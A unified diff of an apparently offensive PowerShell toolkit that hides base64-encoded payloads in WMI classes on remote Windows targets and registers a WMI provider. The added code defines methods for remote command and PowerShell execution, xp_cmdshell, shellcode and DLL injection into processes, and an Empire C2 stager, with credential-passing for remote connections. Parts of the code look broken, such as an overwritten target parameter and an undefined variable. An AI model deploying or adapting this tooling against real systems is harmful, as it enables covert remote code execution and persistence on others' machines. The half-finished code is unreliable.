@@ -36,7 +36,7 @@ Function Invoke-WMIUpload {
     Begin {
         $null = Remove-WmiObject -Class $ClassName -Credential $Credential -ComputerName $Target -Verbose
     } Process {
-        $null = New-WMIClass -ClassName $ClassName -Target $Target -Username $Credential.UserName -SecurePassword $Credential.Password -Verbose
+        $null = New-WMIFSClass -ClassName $ClassName -Target $Target -Username $Credential.UserName -SecurePassword $Credential.Password -Verbose
         $EncodedText = ConvertTo-Base64 -FileName $PayloadPath -Verbose
         Invoke-InsertFileThreaded -Target $Target -EncodedText $EncodedText -FileName $PayloadName -ClassName $ClassName -StrLen 8000 -Verbose -Credential $Credential   
         Invoke-WMIRemoteExtract -Target $Target -PayloadName $PayloadName -ClassName $ClassName -Destination $Destination -Credential $Credential
@@ -191,27 +191,48 @@ Function Install-WMIProvider {
         [Parameter(Mandatory=$true, HelpMessage="Class where payload is stored.")]
             [string]$ClassName,
         [Parameter(Mandatory=$true, HelpMessage="Class where payload is stored.")]
-            [string]$Provider
+            [string]$Provider,
+        [Parameter(Mandatory=$false, HelpMessage=".")]
+            [string]$Username,
+        [Parameter(Mandatory=$false, HelpMessage=".")]
+            [string]$Password,
+        [Parameter(Mandatory=$false, HelpMessage=".")]
+            [SecureString]$SecurePassword
     )
     Begin {
-        $Class = New-Object System.Management.ManagementClass("ROOT\CIMv2", $null)
-        $Class.Name = $ClassName
-        $Class.Qualifiers.Add("dynamic", $true, $false, $true, $false, $true)
-        $Class.Qualifiers.Add("provider", $Provider, $false, $true, $false, $true)
-        $Class.Qualifiers.Add("SupportsCreate", $true)
-        $Class.Qualifiers.Add("CreateBy", "Create")
-        $Class.Qualifiers.Add("SupportsDelete", $true)
-        $Class.Qualifiers.Add("DeleteBy", "DeleteInstance")
-        $Class.Qualifiers.Add("Locale", 1033, $false, $true, $false, $true)
-        #Add new-guid
-        $Class.Qualifiers.Add("UUID", "{8503C4DC-5FBB-11D2-AAC1-006008C78BC7}", $false, $true, $false, $true)
+        $Class = New-WMIProviderClass -Target $Target -UserName $UserName -Password $Password -SecurePassword $SecurePassword
 
         $command = New-MethodParameter -Direction "In" -Property "command" -CimType String
+
+        $parameters = New-MethodParameter -Direction "In" -Property "parameters" -CimType String
+        
+        $server = New-MethodParameter -Direction "In" -Property "server" -CimType String
+        $database = New-MethodParameter -Direction "In" -Property "database" -CimType String
+        $username = New-MethodParameter -Direction "In" -Property "username" -CimType String
+        $password = New-MethodParameter -Direction "In" -Property "password" -CimType String
+
+        $shellcode = New-MethodParameter -Direction "In" -Property "shellCodeString" -CimType String  
+        
+        $processId = New-MethodParameter -Direction "In" -Property "processId" -CimType SInt32    
+
+        $fileName = New-MethodParameter -Direction "In" -Property "fileName" -CimType String
+        
+        $server = New-MethodParameter -Direction "In" -Property "server" -CimType String
+        $stagingKey = New-MethodParameter -Direction "In" -Property "stagingKey" -CimType String
+        $language = New-MethodParameter -Direction "In" -Property "language" -CimType String 
+
         $output = New-MethodParameter -Direction "Out" -Property "output" -CimType String
     } Process {
-        Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "RunCMD" -MethodInParameters @($command) -MethodOutParameters @($output)
+        Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "RunCMD" -MethodInParameters @($command, $parameters) -MethodOutParameters @($output)
+        Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "RunPowerShell" -MethodInParameters @($command) -MethodOutParameters @($output)
+        Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "RunXPCmdShell" -MethodInParameters @($server, $database, $username, $password, $command) -MethodOutParameters @($output)
+        Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "InjectShellCode" -MethodInParameters @($shellcode) -MethodOutParameters @($output)
+        Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "InjectShellCodeRemote" -MethodInParameters @($shellcode, $processId) -MethodOutParameters @($output)
+        Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "InjectDll" -MethodInParameters @($library) -MethodOutParameters @($output)
+        Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "InjectDllRemote" -MethodInParameters @($library, $processId) -MethodOutParameters @($output)
+        Add-WMIProviderClassMethod -Class ([ref] $Class) -MethodName "EmpireStager" -MethodInParameters @($server, $stagingKey, $language) -MethodOutParameters @($output)
     } End { 
-
+        $Class.Put()
     }
 }
 
@@ -273,7 +294,7 @@ Function local:Add-WMIProviderClassMethod {
 
 
 ################################################################################
-# Extract file remotely
+# Don't know what this does
 ################################################################################
 Function Install-WMIProviderManual {
 <#
@@ -370,15 +391,46 @@ Function local:New-WMIProviderClass {
     [CmdletBinding()]
     Param(
         [Parameter(Mandatory=$True, HelpMessage=".")]
-            [String]$ClassName
+            [String]$ClassName,
+        [Parameter(Mandatory=$True, HelpMessage=".")]
+            [String]$Target,
+        [Parameter(Mandatory=$false, HelpMessage=".")]
+            [string]$Username,
+        [Parameter(Mandatory=$false, HelpMessage=".")]
+            [string]$Password,
+        [Parameter(Mandatory=$false, HelpMessage=".")]
+            [SecureString]$SecurePassword,
+        [Parameter(Mandatory=$false, HelpMessage=".")]
+            [switch]$Dynamic
     )
-    $Guid = New-Object System.Guid
+    $Target = "."
+    $ConnectionOptions = New-Object System.Management.ConnectionOptions;
+        if ($Username)
+        {
+            if ($Password)
+            {
+                [SecureString]$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
+            } 
+            $ConnectionOptions.Username = $Username
+            $ConnectionOptions.SecurePassword = [SecureString]$SecurePassword
+        }
+        else
+        {
+            $ConnectionOptions.Impersonation = [System.Management.ImpersonationLevel]::Impersonate;
+        }
+        $Scope = New-Object System.Management.ManagementScope("\\$Target\root\cimv2", $ConnectionOptions);
+        $Class = New-Object System.Management.ManagementClass($Scope, "__Win32Provider", $null);
+
+    $Guid = [System.Guid]::NewGuid()
 
     $Win32Provider = New-Object System.Management.ManagementClass("ROOT", "__Win32Provider", $null)
     $Class = $Win32Provider.Derive($ClassName)
 
-    $Class.Qualifiers.Add("dynamic", $true, $false, $true, $false, $true)
-    $Class.Qualifiers.Add("provider", $Provider, $false, $true, $false, $true)
+    if ($Dynamic)
+    {
+        $Class.Qualifiers.Add("dynamic", $true, $false, $true, $false, $true)
+    }
+    # $Class.Qualifiers.Add("provider", $Provider, $false, $true, $false, $true)
     $Class.Qualifiers.Add("SupportsCreate", $true)
     $Class.Qualifiers.Add("CreateBy", "Create")
     $Class.Qualifiers.Add("SupportsDelete", $true)
@@ -439,7 +491,7 @@ Function local:Invoke-ProviderSetup {
             [String]$HostingModel = "NetworkServiceHost"
     )
 
-    $Guid = New-Object System.Guid
+    $Guid = [System.Guid]::NewGuid()
 
     $__Win32Provider = Set-WmiInstance -Class __Win32Provider -Arguments @{
         Name = $Provider;
@@ -466,7 +518,7 @@ Function local:Invoke-ProviderSetup {
 ################################################################################
 # Create a new WMI Class
 ################################################################################
-Function local:New-WMIClass {
+Function local:New-WMIFSClass {
 <#
 	.SYNOPSIS
 	Creates a new WMI class to be used to store files
@@ -489,22 +541,7 @@ Function local:New-WMIClass {
             [SecureString]$SecurePassword
     )
     Begin {
-        $ConnectionOptions = New-Object System.Management.ConnectionOptions;
-        if ($Username)
-        {
-            if ($Password)
-            {
-                [SecureString]$SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force
-            } 
-            $ConnectionOptions.Username = $Username
-            $ConnectionOptions.SecurePassword = [SecureString]$SecurePassword
-        }
-        else
-        {
-            $ConnectionOptions.Impersonation = System.Management.ImpersonationLevel.Impersonate;
-        }
-        $Scope = New-Object System.Management.ManagementScope("\\$Target\root\cimv2", $ConnectionOptions);
-        $Class = New-Object System.Management.ManagementClass($Scope, [String]::Empty, $null); 
+        $Class = New-WMIClass -ClassName WMIFS -Target $Target -Username $Username -Password $Password -SecurePassword $SecurePassword
     } Process {
         $Class["__CLASS"] = $ClassName; 
 
@@ -556,6 +593,8 @@ Function ConvertTo-Base64 {
     }
 }
 
+################################################################################
+################################################################################
 Function Add-Entry {
     [CmdletBinding()]
     Param(
@@ -804,7 +843,6 @@ Function ConvertFrom-EncryptedText{
         $PlaintextString
     }
 }
-
 
 function local:Invoke-Parallel {
     <#
